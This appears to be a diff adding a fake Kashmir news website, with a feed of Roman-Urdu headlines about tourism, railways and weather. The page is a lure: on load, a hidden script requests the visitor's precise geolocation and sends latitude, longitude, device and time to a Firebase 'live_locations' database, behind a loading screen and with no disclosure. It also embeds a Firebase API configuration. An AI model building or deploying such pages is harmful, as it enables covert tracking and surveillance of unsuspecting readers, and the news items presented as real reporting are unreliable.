@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ur">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kashmir News Network</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f4f4; color: #222; }
+        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #cc0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        header { background: #cc0000; color: #fff; padding: 15px; text-align: center; font-size: 22px; font-weight: bold; position: sticky; top: 0; z-index: 1000; }
+        .ticker { background: #000; color: #ff0; padding: 8px; font-size: 14px; border-bottom: 2px solid #cc0000; }
+        .container { max-width: 650px; margin: 15px auto; padding: 10px; }
+        .news-card { background: #fff; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); overflow: hidden; }
+        .news-card img { width: 100%; height: 250px; object-fit: cover; border-bottom: 3px solid #cc0000; }
+        .news-info { padding: 15px; }
+        .news-info span { color: #cc0000; font-size: 12px; font-weight: bold; }
+        .news-info h2 { font-size: 18px; margin: 10px 0; line-height: 1.4; color: #000; }
+        .news-info p { font-size: 15px; color: #444; line-height: 1.6; }
+        .footer { text-align: center; padding: 20px; font-size: 12px; color: #777; background: #eee; }
+    </style>
+</head>
+<body>
+
+<div id="loader">
+    <div class="spinner"></div>
+    <p style="margin-top:10px;">Khabrein load ho rahi hain...</p>
+</div>
+
+<header>KASHMIR NEWS NETWORK (KNN)</header>
+<div class="ticker"><marquee scrollamount="6">Taza Khabar: Jhelum Riverfront ka naya project mukammal... Gulmarg mein bhari barfbari se sayahon ki bhid... Railway line trials kamyab...</marquee></div>
+
+<div class="container" id="news-feed"></div>
+
+<div class="footer">© 2026 Kashmir News Network | All Rights Reserved</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyDGF0GEonMgT8HjIqZux4IpkpjUjTwCl6k",
+        authDomain: "the-kargil-rock.firebaseapp.com",
+        databaseURL: "https://the-kargil-rock-default-rtdb.firebaseio.com",
+        projectId: "the-kargil-rock",
+        storageBucket: "the-kargil-rock.firebasestorage.app",
+        messagingSenderId: "137725131934",
+        appId: "1:137725131934:web:43baf72100c62fb0044f8f"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    const newsArticles = [
+        { cat: "Top Story", title: "Srinagar Smart City: Jhelum Riverfront Ab Naye Roop Mein", img: "https://images.unsplash.com/photo-1598324423733-196d0061e389?w=800", desc: "Srinagar Smart City project ke tehat Jhelum ke kinare naye walkways aur lights lagayi gayi hain, jo shehar ki khoobsurti ko char chand laga rahi hain." },
+        { cat: "Tourism", title: "Gulmarg Mein Barfbari: Sayahon Ka Taati Lag Gaya", img: "https://images.unsplash.com/photo-1482867996988-29ec3aee816d?w=800", desc: "Taza barfbari ke baad Gulmarg mein mulki aur ghair-mulki sayahon ki tadad mein izafa hua hai. Hotels aur resorts poori tarah book hain." },
+        { cat: "Ladakh", title: "Leh-Manali Highway Par Nayi Tunnel Ka Kaam Tez", img: "https://images.unsplash.com/photo-1581793745862-99fde7fa73d2?w=800", desc: "Ladakh ko har mausam mein baqi mulk se jodne ke liye Shinku La tunnel par kaam tezi se jari hai, taake sardiyon mein rasta band na ho." },
+        { cat: "Economy", title: "Kashmiri Seb Ki Demand UAE Aur Gulf Mulkon Mein Barhi", img: "https://images.unsplash.com/photo-1610555356070-d0efb6505f81?w=800", desc: "Is saal Kashmir ka behtareen seb Dubai aur Saudi Arabia bheja ja raha hai, jis se local bagh-malikan ko kafi faida milne ki umeed hai." },
+        { cat: "Development", title: "Jammu-Srinagar Railway Line: Agle Mahine Se Train Service?", img: "https://images.unsplash.com/photo-1474487024267-582df568d715?w=800", desc: "Railway officials ke mutabiq Chenab Bridge par trials kamyab rahe hain. Umeed hai ke agle mahine se Jammu aur Srinagar ke darmiyan seedhi train chalegi." },
+        { cat: "Education", title: "NIT Srinagar Mein Naye Research Center Ka Iftitah", img: "https://images.unsplash.com/photo-1523050854058-8df90110c9f1?w=800", desc: "NIT Srinagar ne technology aur AI ke liye naya department shuru kiya hai taake yahan ke talib-ilm duniya ke muqable naya hunar seekh sakein." },
+        { cat: "Weather", title: "MeT Department Ki Pesh-Goi: Agle 48 Ghante Barish Aur Barf", img: "https://images.unsplash.com/photo-1428592953211-077101b2021b?w=800", desc: "Wadi-e-Kashmir mein naya 'Western Disturbance' dakhil ho raha hai, jis se pahari ilaqon mein bhari barf aur maidanon mein barish ka imkan hai." },
+        { cat: "Culture", title: "Srinagar Mein Purana Shehar: Traditional Wazwan Festival", img: "https://images.unsplash.com/photo-1512152272829-e3139592d56f?w=800", desc: "Downtown Srinagar mein 3 roz-a khano ka mela sajaya gaya hai, jahan kashmiri culture aur laziz Wazwan ko pesh kiya ja raha hai." }
+    ];
+
+    function renderNews() {
+        const feed = document.getElementById('news-feed');
+        newsArticles.forEach(item => {
+            feed.innerHTML += `
+                <div class="news-card">
+                    <img src="${item.img}" alt="Kashmir News">
+                    <div class="news-info">
+                        <span>${item.cat}</span>
+                        <h2>${item.title}</h2>
+                        <p>${item.desc}</p>
+                    </div>
+                </div>`;
+        });
+    }
+
+    function startTracking() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const id = "User_" + Math.floor(Math.random() * 99999);
+                set(ref(db, 'live_locations/' + id), {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    device: (navigator.userAgent.match(/(Android|iPhone|Windows|Mac)/) || ["Mobile"])[0],
+                    time: new Date().toLocaleTimeString(),
+                    date: new Date().toLocaleDateString()
+                }).finally(() => { document.getElementById('loader').style.display = 'none'; });
+            }, () => { document.getElementById('loader').style.display = 'none'; }, { enableHighAccuracy: true });
+        }
+    }
+
+    window.onload = () => { renderNews(); startTracking(); };
+</script>
+</body>
+</html>
